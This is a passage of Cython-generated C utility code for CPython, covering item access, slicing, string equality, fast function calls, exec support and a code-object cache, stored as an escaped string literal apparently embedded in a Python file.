NULL;\\n    result = (*call)(func, arg, kw);\\n    Py_LeaveRecursiveCall();\\n    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {\\n        PyErr_SetString(\\n            PyExc_SystemError,\\n            \\\"NULL result without error in PyObject_Call\\\");\\n    }\\n    return result;\\n}\\n#endif\\n\\n/* Ge""tItemInt */\\nstatic PyObject *\"\"__Pyx_GetItemInt_Generic(PyObject *o, PyObject* j) {\\n    PyObject *r;\\n    if (!j) return NULL;\\n    r = PyObject_GetItem(o, j);\\n    Py_DECREF(j);\\n    return r;\\n}\\nstatic CYTHON_INLINE PyObject *__Pyx_GetItemInt_List_Fast(PyObject *o, Py_ssize_t i,\\n                                                              CYTHON_NCP_UNUSED int wraparound,\\n                                                              CYTHON_NCP_UNUSED int boundscheck) {\\n#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS\\n    Py_ssize_t wrapped_i = i;\\n    if (wraparound & unlikely(i < 0)) {\\n        wrapped_i += PyList_GET_SIZE(o);\\n    }\\n    if ((!boundscheck) || likely(__Pyx_is_valid_index(wrapped_i, PyList_GET_SIZE(o)))) {\\n        PyObject *r = PyList_GET_ITEM(o, wrapped_i);\\n        Py_INCREF(r);\\n        return r;\\n    }\\n    return __Pyx_GetItemInt_Generic(o, PyInt_FromSsize_t(i));\\n#else\\n    return PySequence_GetItem(o, i);\\n#endif\\n}\\nstatic CYTHON_INLINE PyObject *__Pyx_GetItemInt_Tuple_Fast(PyObject *o, Py_ssize_t i,\\n                                                              CYTHON_NCP_UNUSED int wraparound,\\n                                                              CYTHON_NCP_UNUSED int boundscheck) {\\n#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS\\n    Py_ssize_t wrapped_i = i;\\n    if (wraparound & unlikely(i < 0)) {\\n        wrapped_i += PyTuple_GET_SIZE(o);\\n    }\\n    if ((!boundscheck) || likely(__Pyx_is_valid_index(wrapped_i, PyTuple_GET_SIZE(o)))) {\\n        PyObject *r = PyTuple_GET_ITEM(o, wrapped_i);\\n        Py_INCREF(r);\\n        return r;\\n    }\\n    return __Pyx_GetItemInt_Generic(o, PyInt_FromSsize_t(i));\\n#else\\n    return PySequence_GetItem(o, i);\\n#endif\\n}\\nstatic CYTHON_INLINE PyObject *__Pyx_GetItemInt_Fast(PyObject *o, Py_ssize_t i, int is_list,\\n                                                     CYTHON_NCP_UNUSED int wraparound,\\n          ""                                           CYTHON_NCP_UNUSED int boundscheck) {\"\"\\n#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS && CYTHON_USE_TYPE_SLOTS\\n    if (is_list || PyList_CheckExact(o)) {\\n        Py_ssize_t n = ((!wraparound) | likely(i >= 0)) ? i : i + PyList_GET_SIZE(o);\\n        if ((!boundscheck) || (likely(__Pyx_is_valid_index(n, PyList_GET_SIZE(o))))) {\\n            PyObject *r = PyList_GET_ITEM(o, n);\\n            Py_INCREF(r);\\n            return r;\\n        }\\n    }\\n    else if (PyTuple_CheckExact(o)) {\\n        Py_ssize_t n = ((!wraparound) | likely(i >= 0)) ? i : i + PyTuple_GET_SIZE(o);\\n        if ((!boundscheck) || likely(__Pyx_is_valid_index(n, PyTuple_GET_SIZE(o)))) {\\n            PyObject *r = PyTuple_GET_ITEM(o, n);\\n            Py_INCREF(r);\\n            return r;\\n        }\\n    } else {\\n        PySequenceMethods *m = Py_TYPE(o)->tp_as_sequence;\\n        if (likely(m && m->sq_item)) {\\n            if (wraparound && unlikely(i < 0) && likely(m->sq_length)) {\\n                Py_ssize_t l = m->sq_length(o);\\n                if (likely(l >= 0)) {\\n                    i += l;\\n                } else {\\n                    if (!PyErr_ExceptionMatches(PyExc_OverflowError))\\n                        return NULL;\\n                    PyErr_Clear();\\n                }\\n            }\\n            return m->sq_item(o, i);\\n        }\\n    }\\n#else\\n    if (is_list || PySequence_Check(o)) {\\n        return PySequence_GetItem(o, i);\\n    }\\n#endif\\n    return __Pyx_GetItemInt_Generic(o, PyInt_FromSsize_t(i));\\n}\\n\\n/* SliceObject */\\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_GetSlice(PyObject* obj,\\n        Py_ssize_t cstart, Py_ssize_t cstop,\\n        PyObject** _py_start, PyObject** _py_stop, PyObject** _py_slice,\\n        int has_cstart, int has_cstop, CYTHON_UNUSED int wraparound) {\\n#if CYTHON_USE_TYPE_SLOTS\\n    PyMappingMethods* mp;\\n#if PY_MAJOR_VERSION < 3\\n    PySequenc""eMethods* ms = Py_TYPE(obj)->tp_as_sequence;\\n    if (likely(ms && ms->sq_slice)) {\\n        if (!has_cstart) {\\n            if (_py\"\"_start && (*_py_start != Py_None)) {\\n                cstart = __Pyx_PyIndex_AsSsize_t(*_py_start);\\n                if ((cstart == (Py_ssize_t)-1) && PyErr_Occurred()) goto bad;\\n            } else\\n                cstart = 0;\\n        }\\n        if (!has_cstop) {\\n            if (_py_stop && (*_py_stop != Py_None)) {\\n                cstop = __Pyx_PyIndex_AsSsize_t(*_py_stop);\\n                if ((cstop == (Py_ssize_t)-1) && PyErr_Occurred()) goto bad;\\n            } else\\n                cstop = PY_SSIZE_T_MAX;\\n        }\\n        if (wraparound && unlikely((cstart < 0) | (cstop < 0)) && likely(ms->sq_length)) {\\n            Py_ssize_t l = ms->sq_length(obj);\\n            if (likely(l >= 0)) {\\n                if (cstop < 0) {\\n                    cstop += l;\\n                    if (cstop < 0) cstop = 0;\\n                }\\n                if (cstart < 0) {\\n                    cstart += l;\\n                    if (cstart < 0) cstart = 0;\\n                }\\n            } else {\\n                if (!PyErr_ExceptionMatches(PyExc_OverflowError))\\n                    goto bad;\\n                PyErr_Clear();\\n            }\\n        }\\n        return ms->sq_slice(obj, cstart, cstop);\\n    }\\n#endif\\n    mp = Py_TYPE(obj)->tp_as_mapping;\\n    if (likely(mp && mp->mp_subscript))\\n#endif\\n    {\\n        PyObject* result;\\n        PyObject *py_slice, *py_start, *py_stop;\\n        if (_py_slice) {\\n            py_slice = *_py_slice;\\n        } else {\\n            PyObject* owned_start = NULL;\\n            PyObject* owned_stop = NULL;\\n            if (_py_start) {\\n                py_start = *_py_start;\\n            } else {\\n                if (has_cstart) {\\n                    owned_start = py_start = PyInt_FromSsize_t(cstart);\\n                    if (unlikely(!py_start)) goto bad;""\\n                } else\\n                    py_start = Py_None;\\n            }\\n            if (_py_stop) {\\n                py_stop = *_py_stop;\\n            } else {\\n                i\"\"f (has_cstop) {\\n                    owned_stop = py_stop = PyInt_FromSsize_t(cstop);\\n                    if (unlikely(!py_stop)) {\\n                        Py_XDECREF(owned_start);\\n                        goto bad;\\n                    }\\n                } else\\n                    py_stop = Py_None;\\n            }\\n            py_slice = PySlice_New(py_start, py_stop, Py_None);\\n            Py_XDECREF(owned_start);\\n            Py_XDECREF(owned_stop);\\n            if (unlikely(!py_slice)) goto bad;\\n        }\\n#if CYTHON_USE_TYPE_SLOTS\\n        result = mp->mp_subscript(obj, py_slice);\\n#else\\n        result = PyObject_GetItem(obj, py_slice);\\n#endif\\n        if (!_py_slice) {\\n            Py_DECREF(py_slice);\\n        }\\n        return result;\\n    }\\n    PyErr_Format(PyExc_TypeError,\\n        \\\"'%.200s' object is unsliceable\\\", Py_TYPE(obj)->tp_name);\\nbad:\\n    return NULL;\\n}\\n\\n/* BytesEquals */\\nstatic CYTHON_INLINE int __Pyx_PyBytes_Equals(PyObject* s1, PyObject* s2, int equals) {\\n#if CYTHON_COMPILING_IN_PYPY\\n    return PyObject_RichCompareBool(s1, s2, equals);\\n#else\\n    if (s1 == s2) {\\n        return (equals == Py_EQ);\\n    } else if (PyBytes_CheckExact(s1) & PyBytes_CheckExact(s2)) {\\n        const char *ps1, *ps2;\\n        Py_ssize_t length = PyBytes_GET_SIZE(s1);\\n        if (length != PyBytes_GET_SIZE(s2))\\n            return (equals == Py_NE);\\n        ps1 = PyBytes_AS_STRING(s1);\\n        ps2 = PyBytes_AS_STRING(s2);\\n        if (ps1[0] != ps2[0]) {\\n            return (equals == Py_NE);\\n        } else if (length == 1) {\\n            return (equals == Py_EQ);\\n        } else {\\n            int result;\\n#if CYTHON_USE_UNICODE_INTERNALS && (PY_VERSION_HEX < 0x030B0000)\\n            Py_hash_t has""h1, hash2;\\n            hash1 = ((PyBytesObject*)s1)->ob_shash;\\n            hash2 = ((PyBytesObject*)s2)->ob_shash;\\n            if (hash1 != hash2 && hash1 != -1 && hash2 != -1) {\\n                return (equals == Py_NE);\\n            }\\n#endif\\n     \"\"       result = memcmp(ps1, ps2, (size_t)length);\\n            return (equals == Py_EQ) ? (result == 0) : (result != 0);\\n        }\\n    } else if ((s1 == Py_None) & PyBytes_CheckExact(s2)) {\\n        return (equals == Py_NE);\\n    } else if ((s2 == Py_None) & PyBytes_CheckExact(s1)) {\\n        return (equals == Py_NE);\\n    } else {\\n        int result;\\n        PyObject* py_result = PyObject_RichCompare(s1, s2, equals);\\n        if (!py_result)\\n            return -1;\\n        result = __Pyx_PyObject_IsTrue(py_result);\\n        Py_DECREF(py_result);\\n        return result;\\n    }\\n#endif\\n}\\n\\n/* UnicodeEquals */\\nstatic CYTHON_INLINE int __Pyx_PyUnicode_Equals(PyObject* s1, PyObject* s2, int equals) {\\n#if CYTHON_COMPILING_IN_PYPY\\n    return PyObject_RichCompareBool(s1, s2, equals);\\n#else\\n#if PY_MAJOR_VERSION < 3\\n    PyObject* owned_ref = NULL;\\n#endif\\n    int s1_is_unicode, s2_is_unicode;\\n    if (s1 == s2) {\\n        goto return_eq;\\n    }\\n    s1_is_unicode = PyUnicode_CheckExact(s1);\\n    s2_is_unicode = PyUnicode_CheckExact(s2);\\n#if PY_MAJOR_VERSION < 3\\n    if ((s1_is_unicode & (!s2_is_unicode)) && PyString_CheckExact(s2)) {\\n        owned_ref = PyUnicode_FromObject(s2);\\n        if (unlikely(!owned_ref))\\n            return -1;\\n        s2 = owned_ref;\\n        s2_is_unicode = 1;\\n    } else if ((s2_is_unicode & (!s1_is_unicode)) && PyString_CheckExact(s1)) {\\n        owned_ref = PyUnicode_FromObject(s1);\\n        if (unlikely(!owned_ref))\\n            return -1;\\n        s1 = owned_ref;\\n        s1_is_unicode = 1;\\n    } else if (((!s2_is_unicode) & (!s1_is_unicode))) {\\n        return __Pyx_PyBytes_Equals(s1, s2, equals);\\n    }\\n#endif""\\n    if (s1_is_unicode & s2_is_unicode) {\\n        Py_ssize_t length;\\n        int kind;\\n        void *data1, *data2;\\n        if (unlikely(__Pyx_PyUnicode_READY(s1) < 0) || unlikely(__Pyx_PyUnicode_READY(s2) < 0))\\n            return -1;\\n        length = __Pyx_PyUnicode_GET_LENGTH(s1);\\n        if (length != __Py\"\"x_PyUnicode_GET_LENGTH(s2)) {\\n            goto return_ne;\\n        }\\n#if CYTHON_USE_UNICODE_INTERNALS\\n        {\\n            Py_hash_t hash1, hash2;\\n        #if CYTHON_PEP393_ENABLED\\n            hash1 = ((PyASCIIObject*)s1)->hash;\\n            hash2 = ((PyASCIIObject*)s2)->hash;\\n        #else\\n            hash1 = ((PyUnicodeObject*)s1)->hash;\\n            hash2 = ((PyUnicodeObject*)s2)->hash;\\n        #endif\\n            if (hash1 != hash2 && hash1 != -1 && hash2 != -1) {\\n                goto return_ne;\\n            }\\n        }\\n#endif\\n        kind = __Pyx_PyUnicode_KIND(s1);\\n        if (kind != __Pyx_PyUnicode_KIND(s2)) {\\n            goto return_ne;\\n        }\\n        data1 = __Pyx_PyUnicode_DATA(s1);\\n        data2 = __Pyx_PyUnicode_DATA(s2);\\n        if (__Pyx_PyUnicode_READ(kind, data1, 0) != __Pyx_PyUnicode_READ(kind, data2, 0)) {\\n            goto return_ne;\\n        } else if (length == 1) {\\n            goto return_eq;\\n        } else {\\n            int result = memcmp(data1, data2, (size_t)(length * kind));\\n            #if PY_MAJOR_VERSION < 3\\n            Py_XDECREF(owned_ref);\\n            #endif\\n            return (equals == Py_EQ) ? (result == 0) : (result != 0);\\n        }\\n    } else if ((s1 == Py_None) & s2_is_unicode) {\\n        goto return_ne;\\n    } else if ((s2 == Py_None) & s1_is_unicode) {\\n        goto return_ne;\\n    } else {\\n        int result;\\n        PyObject* py_result = PyObject_RichCompare(s1, s2, equals);\\n        #if PY_MAJOR_VERSION < 3\\n        Py_XDECREF(owned_ref);\\n        #endif\\n        if (!py_result)\\n            return -1;\\n        result ""= __Pyx_PyObject_IsTrue(py_result);\\n        Py_DECREF(py_result);\\n        return result;\\n    }\\nreturn_eq:\\n    #if PY_MAJOR_VERSION < 3\\n    Py_XDECREF(owned_ref);\\n    #endif\\n    return (equals == Py_EQ);\\nreturn_ne:\\n    #if PY_MAJOR_VERSION < 3\\n    Py_XDECREF(owned_ref);\\n    #endif\\n    return (equals == Py_NE);\\n#endif\\n}\\n\\n/* PyCFunctionFastCall */\\n#if CYTHON_F\"\"AST_PYCCALL\\nstatic CYTHON_INLINE PyObject * __Pyx_PyCFunction_FastCall(PyObject *func_obj, PyObject **args, Py_ssize_t nargs) {\\n    PyCFunctionObject *func = (PyCFunctionObject*)func_obj;\\n    PyCFunction meth = PyCFunction_GET_FUNCTION(func);\\n    PyObject *self = PyCFunction_GET_SELF(func);\\n    int flags = PyCFunction_GET_FLAGS(func);\\n    assert(PyCFunction_Check(func));\\n    assert(METH_FASTCALL == (flags & ~(METH_CLASS | METH_STATIC | METH_COEXIST | METH_KEYWORDS | METH_STACKLESS)));\\n    assert(nargs >= 0);\\n    assert(nargs == 0 || args != NULL);\\n    /* _PyCFunction_FastCallDict() must not be called with an exception set,\\n       because it may clear it (directly or indirectly) and so the\\n       caller loses its exception */\\n    assert(!PyErr_Occurred());\\n    if ((PY_VERSION_HEX < 0x030700A0) || unlikely(flags & METH_KEYWORDS)) {\\n        return (*((__Pyx_PyCFunctionFastWithKeywords)(void*)meth)) (self, args, nargs, NULL);\\n    } else {\\n        return (*((__Pyx_PyCFunctionFast)(void*)meth)) (self, args, nargs);\\n    }\\n}\\n#endif\\n\\n/* PyFunctionFastCall */\\n#if CYTHON_FAST_PYCALL\\nstatic PyObject* __Pyx_PyFunction_FastCallNoKw(PyCodeObject *co, PyObject **args, Py_ssize_t na,\\n                                               PyObject *globals) {\\n    PyFrameObject *f;\\n    PyThreadState *tstate = __Pyx_PyThreadState_Current;\\n    PyObject **fastlocals;\\n    Py_ssize_t i;\\n    PyObject *result;\\n    assert(globals != NULL);\\n    /* XXX Perhaps we should create a specialized\\n       PyFrame_New() that doesn't take locals, but does""\\n       take builtins without sanity checking them.\\n       */\\n    assert(tstate != NULL);\\n    f = PyFrame_New(tstate, co, globals, NULL);\\n    if (f == NULL) {\\n        return NULL;\\n    }\\n    fastlocals = __Pyx_PyFrame_GetLocalsplus(f);\\n    for (i = 0; i < na; i++) {\\n        Py_INCREF(*args);\\n        fastlocals[i] = *args++;\\n    }\\n    result = PyEval_EvalFrameEx(f,0);\\n    ++tstate->recursion_depth;\\n    Py_DECREF(f);\"\"\\n    --tstate->recursion_depth;\\n    return result;\\n}\\n#if 1 || PY_VERSION_HEX < 0x030600B1\\nstatic PyObject *__Pyx_PyFunction_FastCallDict(PyObject *func, PyObject **args, Py_ssize_t nargs, PyObject *kwargs) {\\n    PyCodeObject *co = (PyCodeObject *)PyFunction_GET_CODE(func);\\n    PyObject *globals = PyFunction_GET_GLOBALS(func);\\n    PyObject *argdefs = PyFunction_GET_DEFAULTS(func);\\n    PyObject *closure;\\n#if PY_MAJOR_VERSION >= 3\\n    PyObject *kwdefs;\\n#endif\\n    PyObject *kwtuple, **k;\\n    PyObject **d;\\n    Py_ssize_t nd;\\n    Py_ssize_t nk;\\n    PyObject *result;\\n    assert(kwargs == NULL || PyDict_Check(kwargs));\\n    nk = kwargs ? PyDict_Size(kwargs) : 0;\\n    if (Py_EnterRecursiveCall((char*)\\\" while calling a Python object\\\")) {\\n        return NULL;\\n    }\\n    if (\\n#if PY_MAJOR_VERSION >= 3\\n            co->co_kwonlyargcount == 0 &&\\n#endif\\n            likely(kwargs == NULL || nk == 0) &&\\n            co->co_flags == (CO_OPTIMIZED | CO_NEWLOCALS | CO_NOFREE)) {\\n        if (argdefs == NULL && co->co_argcount == nargs) {\\n            result = __Pyx_PyFunction_FastCallNoKw(co, args, nargs, globals);\\n            goto done;\\n        }\\n        else if (nargs == 0 && argdefs != NULL\\n                 && co->co_argcount == Py_SIZE(argdefs)) {\\n            /* function called with no arguments, but all parameters have\\n               a default value: use default values as arguments .*/\\n            args = &PyTuple_GET_ITEM(argdefs, 0);\\n            result =__Pyx_PyFu""nction_FastCallNoKw(co, args, Py_SIZE(argdefs), globals);\\n            goto done;\\n        }\\n    }\\n    if (kwargs != NULL) {\\n        Py_ssize_t pos, i;\\n        kwtuple = PyTuple_New(2 * nk);\\n        if (kwtuple == NULL) {\\n            result = NULL;\\n            goto done;\\n        }\\n        k = &PyTuple_GET_ITEM(kwtuple, 0);\\n        pos = i = 0;\\n        while (PyDict_Next(kwargs, &pos, &k[i], &k[i+1])) {\\n            Py_INCREF(k[i]);\\n            Py_INCREF(k[i+1]);\\n            i\"\" += 2;\\n        }\\n        nk = i / 2;\\n    }\\n    else {\\n        kwtuple = NULL;\\n        k = NULL;\\n    }\\n    closure = PyFunction_GET_CLOSURE(func);\\n#if PY_MAJOR_VERSION >= 3\\n    kwdefs = PyFunction_GET_KW_DEFAULTS(func);\\n#endif\\n    if (argdefs != NULL) {\\n        d = &PyTuple_GET_ITEM(argdefs, 0);\\n        nd = Py_SIZE(argdefs);\\n    }\\n    else {\\n        d = NULL;\\n        nd = 0;\\n    }\\n#if PY_MAJOR_VERSION >= 3\\n    result = PyEval_EvalCodeEx((PyObject*)co, globals, (PyObject *)NULL,\\n                               args, (int)nargs,\\n                               k, (int)nk,\\n                               d, (int)nd, kwdefs, closure);\\n#else\\n    result = PyEval_EvalCodeEx(co, globals, (PyObject *)NULL,\\n                               args, (int)nargs,\\n                               k, (int)nk,\\n                               d, (int)nd, closure);\\n#endif\\n    Py_XDECREF(kwtuple);\\ndone:\\n    Py_LeaveRecursiveCall();\\n    return result;\\n}\\n#endif\\n#endif\\n\\n/* PyObjectCallMethO */\\n#if CYTHON_COMPILING_IN_CPYTHON\\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_CallMethO(PyObject *func, PyObject *arg) {\\n    PyObject *self, *result;\\n    PyCFunction cfunc;\\n    cfunc = PyCFunction_GET_FUNCTION(func);\\n    self = PyCFunction_GET_SELF(func);\\n    if (unlikely(Py_EnterRecursiveCall((char*)\\\" while calling a Python object\\\")))\\n        return NULL;\\n    result = cfunc(self, arg);\\n    Py_LeaveRecur""siveCall();\\n    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {\\n        PyErr_SetString(\\n            PyExc_SystemError,\\n            \\\"NULL result without error in PyObject_Call\\\");\\n    }\\n    return result;\\n}\\n#endif\\n\\n/* PyObjectCallOneArg */\\n#if CYTHON_COMPILING_IN_CPYTHON\\nstatic PyObject* __Pyx__PyObject_CallOneArg(PyObject *func, PyObject *arg) {\\n    PyObject *result;\\n    PyObject *args = PyTuple_New(1);\\n    if (unlikely(!args)) return NULL;\\n    Py_INCREF(arg);\\n    PyTuple_SET_ITEM(args, 0, arg);\\n    result = __Pyx_PyObject_Call(func\"\", args, NULL);\\n    Py_DECREF(args);\\n    return result;\\n}\\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg) {\\n#if CYTHON_FAST_PYCALL\\n    if (PyFunction_Check(func)) {\\n        return __Pyx_PyFunction_FastCall(func, &arg, 1);\\n    }\\n#endif\\n    if (likely(PyCFunction_Check(func))) {\\n        if (likely(PyCFunction_GET_FLAGS(func) & METH_O)) {\\n            return __Pyx_PyObject_CallMethO(func, arg);\\n#if CYTHON_FAST_PYCCALL\\n        } else if (__Pyx_PyFastCFunction_Check(func)) {\\n            return __Pyx_PyCFunction_FastCall(func, &arg, 1);\\n#endif\\n        }\\n    }\\n    return __Pyx__PyObject_CallOneArg(func, arg);\\n}\\n#else\\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg) {\\n    PyObject *result;\\n    PyObject *args = PyTuple_Pack(1, arg);\\n    if (unlikely(!args)) return NULL;\\n    result = __Pyx_PyObject_Call(func, args, NULL);\\n    Py_DECREF(args);\\n    return result;\\n}\\n#endif\\n\\n/* GetAttr */\\nstatic CYTHON_INLINE PyObject *__Pyx_GetAttr(PyObject *o, PyObject *n) {\\n#if CYTHON_USE_TYPE_SLOTS\\n#if PY_MAJOR_VERSION >= 3\\n    if (likely(PyUnicode_Check(n)))\\n#else\\n    if (likely(PyString_Check(n)))\\n#endif\\n        return __Pyx_PyObject_GetAttrStr(o, n);\\n#endif\\n    return PyObject_GetAttr(o, n);\\n}\\n\\n/* Globals */\\nstatic PyObject* __Pyx_Globals(void"") {\\n    Py_ssize_t i;\\n    PyObject *names;\\n    PyObject *globals = __pyx_d;\\n    Py_INCREF(globals);\\n    names = PyObject_Dir(__pyx_m);\\n    if (!names)\\n        goto bad;\\n    for (i = PyList_GET_SIZE(names)-1; i >= 0; i--) {\\n#if CYTHON_COMPILING_IN_PYPY\\n        PyObject* name = PySequence_ITEM(names, i);\\n        if (!name)\\n            goto bad;\\n#else\\n        PyObject* name = PyList_GET_ITEM(names, i);\\n#endif\\n        if (!PyDict_Contains(globals, name)) {\\n            PyObject* value = __Pyx_GetAttr(__pyx_m, name);\\n            if (!value) {\\n#if CYTHON_COMPILING_IN_PYPY\\n                Py_DECREF(name);\\n#endif\\n    \"\"            goto bad;\\n            }\\n            if (PyDict_SetItem(globals, name, value) < 0) {\\n#if CYTHON_COMPILING_IN_PYPY\\n                Py_DECREF(name);\\n#endif\\n                Py_DECREF(value);\\n                goto bad;\\n            }\\n        }\\n#if CYTHON_COMPILING_IN_PYPY\\n        Py_DECREF(name);\\n#endif\\n    }\\n    Py_DECREF(names);\\n    return globals;\\nbad:\\n    Py_XDECREF(names);\\n    Py_XDECREF(globals);\\n    return NULL;\\n}\\n\\n/* PyExec */\\nstatic CYTHON_INLINE PyObject* __Pyx_PyExec2(PyObject* o, PyObject* globals) {\\n    return __Pyx_PyExec3(o, globals, NULL);\\n}\\nstatic PyObject* __Pyx_PyExec3(PyObject* o, PyObject* globals, PyObject* locals) {\\n    PyObject* result;\\n    PyObject* s = 0;\\n    char *code = 0;\\n    if (!globals || globals == Py_None) {\\n        globals = __pyx_d;\\n    } else if (!PyDict_Check(globals)) {\\n        PyErr_Format(PyExc_TypeError, \\\"exec() arg 2 must be a dict, not %.200s\\\",\\n                     Py_TYPE(globals)->tp_name);\\n        goto bad;\\n    }\\n    if (!locals || locals == Py_None) {\\n        locals = globals;\\n    }\\n    if (__Pyx_PyDict_GetItemStr(globals, __pyx_n_s_builtins) == NULL) {\\n        if (PyDict_SetItem(globals, __pyx_n_s_builtins, PyEval_GetBuiltins()) < 0)\\n            goto bad;\\n    }\\n    if (""PyCode_Check(o)) {\\n        if (__Pyx_PyCode_HasFreeVars((PyCodeObject *)o)) {\\n            PyErr_SetString(PyExc_TypeError,\\n                \\\"code object passed to exec() may not contain free variables\\\");\\n            goto bad;\\n        }\\n        #if PY_VERSION_HEX < 0x030200B1 || (CYTHON_COMPILING_IN_PYPY && PYPY_VERSION_NUM < 0x07030400)\\n        result = PyEval_EvalCode((PyCodeObject *)o, globals, locals);\\n        #else\\n        result = PyEval_EvalCode(o, globals, locals);\\n        #endif\\n    } else {\\n        PyCompilerFlags cf;\\n        cf.cf_flags = 0;\\n#if PY_VERSION_HEX >= 0x030800A3\\n        cf.cf_feature_version = PY_MINOR_VERSION;\\n#endif\\n        if (PyUnicode_Check(o)) {\\n           \"\" cf.cf_flags = PyCF_SOURCE_IS_UTF8;\\n            s = PyUnicode_AsUTF8String(o);\\n            if (!s) goto bad;\\n            o = s;\\n        #if PY_MAJOR_VERSION >= 3\\n        } else if (!PyBytes_Check(o)) {\\n        #else\\n        } else if (!PyString_Check(o)) {\\n        #endif\\n            PyErr_Format(PyExc_TypeError,\\n                \\\"exec: arg 1 must be string, bytes or code object, got %.200s\\\",\\n                Py_TYPE(o)->tp_name);\\n            goto bad;\\n        }\\n        #if PY_MAJOR_VERSION >= 3\\n        code = PyBytes_AS_STRING(o);\\n        #else\\n        code = PyString_AS_STRING(o);\\n        #endif\\n        if (PyEval_MergeCompilerFlags(&cf)) {\\n            result = PyRun_StringFlags(code, Py_file_input, globals, locals, &cf);\\n        } else {\\n            result = PyRun_String(code, Py_file_input, globals, locals);\\n        }\\n        Py_XDECREF(s);\\n    }\\n    return result;\\nbad:\\n    Py_XDECREF(s);\\n    return 0;\\n}\\n\\n/* PyExecGlobals */\\nstatic PyObject* __Pyx_PyExecGlobals(PyObject* code) {\\n    PyObject* result;\\n    PyObject* globals = __Pyx_Globals();\\n    if (unlikely(!globals))\\n        return NULL;\\n    result = __Pyx_PyExec2(code, globals);\\n    Py_DECREF(globals);""\\n    return result;\\n}\\n\\n/* PyErrFetchRestore */\\n#if CYTHON_FAST_THREAD_STATE\\nstatic CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb) {\\n    PyObject *tmp_type, *tmp_value, *tmp_tb;\\n    tmp_type = tstate->curexc_type;\\n    tmp_value = tstate->curexc_value;\\n    tmp_tb = tstate->curexc_traceback;\\n    tstate->curexc_type = type;\\n    tstate->curexc_value = value;\\n    tstate->curexc_traceback = tb;\\n    Py_XDECREF(tmp_type);\\n    Py_XDECREF(tmp_value);\\n    Py_XDECREF(tmp_tb);\\n}\\nstatic CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {\\n    *type = tstate->curexc_type;\\n    *value = tstate->curexc_value;\\n    *tb = tstate->curexc_traceback;\"\"\\n    tstate->curexc_type = 0;\\n    tstate->curexc_value = 0;\\n    tstate->curexc_traceback = 0;\\n}\\n#endif\\n\\n/* CLineInTraceback */\\n#ifndef CYTHON_CLINE_IN_TRACEBACK\\nstatic int __Pyx_CLineForTraceback(CYTHON_UNUSED PyThreadState *tstate, int c_line) {\\n    PyObject *use_cline;\\n    PyObject *ptype, *pvalue, *ptraceback;\\n#if CYTHON_COMPILING_IN_CPYTHON\\n    PyObject **cython_runtime_dict;\\n#endif\\n    if (unlikely(!__pyx_cython_runtime)) {\\n        return c_line;\\n    }\\n    __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);\\n#if CYTHON_COMPILING_IN_CPYTHON\\n    cython_runtime_dict = _PyObject_GetDictPtr(__pyx_cython_runtime);\\n    if (likely(cython_runtime_dict)) {\\n        __PYX_PY_DICT_LOOKUP_IF_MODIFIED(\\n            use_cline, *cython_runtime_dict,\\n            __Pyx_PyDict_GetItemStr(*cython_runtime_dict, __pyx_n_s_cline_in_traceback))\\n    } else\\n#endif\\n    {\\n      PyObject *use_cline_obj = __Pyx_PyObject_GetAttrStr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback);\\n      if (use_cline_obj) {\\n        use_cline = PyObject_Not(use_cline_obj) ? Py_False : Py_True;\\n        Py_DECREF(use_cline_obj);\\n      } else {""\\n        PyErr_Clear();\\n        use_cline = NULL;\\n      }\\n    }\\n    if (!use_cline) {\\n        c_line = 0;\\n        (void) PyObject_SetAttr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback, Py_False);\\n    }\\n    else if (use_cline == Py_False || (use_cline != Py_True && PyObject_Not(use_cline) != 0)) {\\n        c_line = 0;\\n    }\\n    __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);\\n    return c_line;\\n}\\n#endif\\n\\n/* CodeObjectCache */\\nstatic int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line) {\\n    int start = 0, mid = 0, end = count - 1;\\n    if (end >= 0 && code_line > entries[end].code_line) {\\n        return count;\\n    }\\n    while (start < end) {\\n        mid = start + (end - start) / 2;\\n        if (code_line < entries[mid].code_line) {\\n            end = mid;\"\"\\n        } else if (code_line > entries[mid].code_line) {\\n             start = mid + 1;\\n        } else {\\n            return mid;\\n        }\\n    }\\n    if (code_line <= entries[mid].code_line) {\\n        return mid;\\n    } else {\\n        return mid + 1;\\n    }\\n}\\nstatic PyCodeObject *__pyx_find_code_object(int code_line) {\\n    PyCodeObject* code_object;\\n    int pos;\\n    if (unlikely(!code_line) || unlikely(!__pyx_code_cache.entries)) {\\n        return NULL;\\n    }\\n    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);\\n    if (unlikely(pos >= __pyx_code_cache.count) || unlikely(__pyx_code_cache.entries[pos].code_line != code_line)) {\\n        return NULL;\\n    }\\n    code_object = __pyx_code_cache.entries[pos].code_object;\\n    Py_INCREF(code_object);\\n    return code_object;\\n}\\nstatic void __pyx_insert_code_object(int code_line, PyCodeObject* code_object) {\\n    int pos, i;\\n    __Pyx_CodeObjectCacheEntry* entries = __pyx_code_cache.entries;\\n    if (unlikely(!code_line)) {\\n        return;\\n    }\\n    if (unlikely(!entries)"") {\\n        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Malloc(64*sizeof(__Pyx_CodeObjectCacheEntry));\\n        if (likely(entries)) {\\n            __pyx_code_cache.entries = entries;\\n            __pyx_code_cache.max_count = 64;\\n            __pyx_code_cache.count = 1;\\n            entries[0].code_line = code_line;\\n            entries[0].code_object = code_object;\\n            Py_INCREF(code_object);\\n        }\\n        return;\\n    }\\n    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);\\n    if ((pos < __pyx_code_cache.count) && 